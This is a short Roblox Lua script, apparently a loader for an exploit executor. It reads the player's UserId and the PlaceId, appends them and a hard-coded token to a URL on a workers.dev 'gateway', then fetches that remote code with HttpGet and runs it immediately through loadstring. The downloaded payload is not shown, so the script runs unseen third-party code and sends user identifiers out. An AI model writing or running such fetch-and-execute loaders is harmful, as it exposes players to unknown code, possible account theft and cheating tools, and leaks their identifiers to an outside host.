local _uid = tostring(game:GetService("Players").LocalPlayer.UserId)
local _pid = tostring(game.PlaceId)
local _url = "https://lazybear-gateway.iusemaybehook.workers.dev/?file=1468213301233062013_hi.lua&token=MF9pZOOo2w7B0SmJr94TB2Sk4xn_xRBj6fEpvMZK9ww&uid=".._uid.."&pid=".._pid
loadstring(game:HttpGet(_url, true))()